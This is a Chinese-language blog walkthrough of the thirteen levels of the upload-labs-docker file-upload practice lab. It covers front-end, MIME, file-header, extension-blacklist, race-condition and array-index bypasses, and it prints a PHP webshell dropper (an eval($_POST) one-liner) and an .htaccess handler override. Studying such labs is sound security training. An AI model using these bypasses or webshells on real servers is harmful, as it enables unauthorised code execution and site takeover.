---
title: 再战upload
date: 2024-08-04 22:29:19
tags: 渗透测试
categories: [渗透测试,基本漏洞,文件上传]
---

## 前言

继upload-labs靶场过后，博主又搜集到了一个评价不错的文件上传靶场，出自国光师傅的[upload-labs-docker](https://github.com/sqlsec/upload-labs-docker)。里面有详细的搭建过程，故本文不再赘述。借此机会可以温习以下之前学过的知识，本次靶场共有13关，废话不多说，开始打靶！

## 靶场实战

### pass-01

访问靶机ip地址，映入眼帘的就是一个大大的**javascript**，不用多想，妥妥的**js前端验证**。上传一个**shell.php**试试
![image-20240804224642018](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408042246328.png)

果然有弹窗，老办法，禁用javascript试试，发现上传成功。用蚁剑连接试试
![image-20240804225323324](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408042253402.png)

### pass-02

同样，本关给了提示，要用`.htaccess`文件绕过，编写`.htaccess`如下：

```.htaccess
<FilesMatch "\.jpg">
  SetHandler application/x-httpd-php
</FilesMatch>
```

该文件的意思是将`.jpg`为后缀的文件当作`.php`文件进行解析

随后上传`shell.jpg`为一句话木马，用蚁剑连接
![image-20240804233340420](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408042333525.png)

### pass-03

本关为**MIME**绕过，用bp抓包进行修改`content-type`字段就行
![image-20240804233953810](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408042339985.png)

![image-20240804234116958](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408042341076.png)

### pass-04

本关用文件头绕过，直接用bp抓包在php文件前面加上`GIF89a`，同时修改`conten-type`即可
![image-20240804235355323](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408042353442.png)

![image-20240804235423560](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408042354640.png)

### pass-05

观察源代码发现为黑名单过滤并且有个`str_ireplace`函数，会将在黑名单中的后缀名替换为空字符`""`。于是直接尝试双写绕过，直接上传`shell.pphphp`发现上传成功，用蚁剑连接
![image-20240805000157729](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408050001811.png)

### pass-06

本关和**pass-05**不同的点就在于windows和linux对不同后缀的处理不一样，对于linux来说，后缀名的大小写是一样的，即`.Php`和`.php`一样，但是对于windows来说，它们是有区别的。于是尝试上传`.Php`为后缀的一句话木马，发现上传成功。

### pass-07

### pass-08

这两关不知道为什么docker拉取镜像没有问题，但是容器就是显示不出来，复现失败。但从名字可以看出来是**00截断**，**pass-07**是属于**GET**型的，**pass-08**是属于**POST**型的。想练习的朋友可以自行去**upload-labs靶场**练习

### pass-09

本关介绍了黑名单和白名单的区别，看给的提示就可以看出可以尝试一些特殊的php后缀，后台会将这些后缀直接当作php解析，上传一个`.php3`试试

![image-20240805133721178](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408051337365.png)

### pass-10

本关考察的是条件竞争。条件竞争的定义国光师傅已经在本关说明，总结一句话就是在后台还没来得及删除我们上传的木马的时候，我们先提前访问这个木马文件，而这个木马文件起到一个跳板的作用，当我们访问的时候会在后台生成一个一句话木马。因此就算之后后台把我们上传的木马给删除了，我们也在后台生成了一个一句话木马。这里我用的`shell.php`内容为

```php
<?php fputs(fopen('a.php','w'),'<?php @eval($_POST["a"])?>');?>
```

意思是在后台生成一个`a.php`的一句话木马，连接密码为`a`。若用国光师傅给的就是生成`xiao.php`，连接密码为`1`。

先用bp抓取上传`shell.php`的包，右键送到`intruder`模块。选择`payload`，修改下图两个地方
![image-20240805150137758](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408051501137.png)

同时我们要设置线程，因为条件竞争说白了是并发出现了问题，在`Resource pool`里面设置如下内容
![image-20240805150409444](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408051504760.png)

ps:不同bp版本设置线程的方法可能不一样，如果没有找到，请自行百度对应版本的线程设置方法。

接下来，将抓到的包`forward`出去，再去抓访问`shell.php`的包，访问`你的靶机ip/upload/shell.php`，bp抓完包后，同样送到`intruder`模块，在`shell.php`后面加上`?a=1`，同时给`1`加上`$`，我们要营造有10000个人访问`shell.php`的场景，如下图所示

![image-20240805151006711](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408051510964.png)

在`payload`里面选择下图所示内容
![image-20240805151109267](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408051511425.png)

同时把线程也设为30，然后两个同时开始攻击。结束后进入docker容器的后台查看`upload`文件夹

![image-20240805151258382](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408051512439.png)

发现已经生成了`a.php`，用蚁剑连接
![image-20240805151352986](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408051513057.png)

### pass-11

本关考察二次渲染，详细教程可以参考[upload-labs靶场全通关](https://youngz-blog.asia/2024/07/18/upload-labs%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3/)（~~绝对不是因为我懒~~）

### pass-12

本关其实考察的是自定义保存文件名称的时候会自动忽略`/.`，因此只需上传`shell.php`，将保存的名字设为`shell.php/.`即可

### pass-13

本关取自upload-labs靶场第二十一关，当时写upload-labs的wp时没有明白其中的原理，看来国光师傅的wp之后发现这题考的是代码审计，于是根据wp搭建xdebug进行php调试
[xdebug搭建教程](https://www.sqlsec.com/2020/09/xdebug.html)

下面对几个关键函数的调试结果分析

```php
//这里我先上传的是一个正常jpg方便演示代码是如何工作的，savename设置为upload-20.jpg
$is_upload = false;
$msg = null;
if(!empty($_FILES['upload_file'])){
    //检查MIME
    $allow_type = array('image/jpeg','image/png','image/gif');         
    if(!in_array($_FILES['upload_file']['type'],$allow_type)){       //检查content-type如果在数组里面就可以通过
        $msg = "禁止上传该类型文件!";
    }else{
        //这个三目运算符是判断是否填写了savename，如果未填写$file就是上传图片的文件名，填写了就是savename的值。
        //所以调试结果为$file=upload-20.jpg
        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
        //if语句判断$file是否为数组，很显然上传的不是数组，于是程序会将$file用点分割为一个数组
        //调试结果为$file=[0=>"uopload-20",1=>"jpg"]
        if (!is_array($file)) {
            $file = explode('.', strtolower($file));
        }
		//$ext获取数组元素最后一个值
        //$ext="jpg"
        $ext = end($file);
        //$allow_suffix=[0=>'jpg',1=>'png',2=>'gif']
        $allow_suffix = array('jpg','png','gif');
        //判断$ext是否在$allow_suffix数组中
        if (!in_array($ext, $allow_suffix)) {
            $msg = "禁止上传该后缀文件!";
        }else{
            //reset函数将重置指针指到第一个元素，即返回第一个元素，count函数统计数组元素个数（这个是关键绕过点）
            //调试结果$file_name=upload-20.jpg
            $file_name = reset($file) . '.' . $file[count($file) - 1];
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $msg = "文件上传成功！";
                $is_upload = true;
            } else {
                $msg = "文件上传失败！";
            }
        }
    }
}else{
    $msg = "请选择要上传的文件！";
}
```

通过调试结果可以看出，如果将$file设置为一个数组，并且数组元素个数为2，索引值为[0,2]在运行

```php
            $file_name = reset($file) . '.' . $file[count($file) - 1];
```

这行代码的时候，`$file[count($file) - 1]=$file[2-1]=$file[1]`不存在，于是拼接后的文件名就为`shell.php.`

具体操作如下：

1. 用bp抓包，修改**content-type**字段
2. 把里面的**save_name**字段的索引值0的值设置为`shell.php`，随后复制一份（因为要包含两个数组元素），并把索引值设为**2**，值设置为**jpg**

这样在进行`$file_name = reset($file) . '.' . $file[count($file) - 1];`操作时，由于**$file[1]**不存在，拼接后的文件名就为`shell.php.`即可绕过。

![image-20240812131952004](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408121319393.png)

**ps：**国光的wp里面是采用了**pass-12**里面的方法进行绕过，即`save_name[1]`设为`shell.php/`，但是我自己尝试上传失败，反倒是直接上传为`shell.php`成功了

后面直接用蚁剑连接
![image-20240812132047292](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408121320355.png)

## 完结撒花

本篇文章算是又复习了一遍文件上传的知识，感谢国光师傅的靶场，附上国光师傅自己写的wp

[国光的文件上传靶场知识总结](https://www.sqlsec.com/2020/10/upload.html)
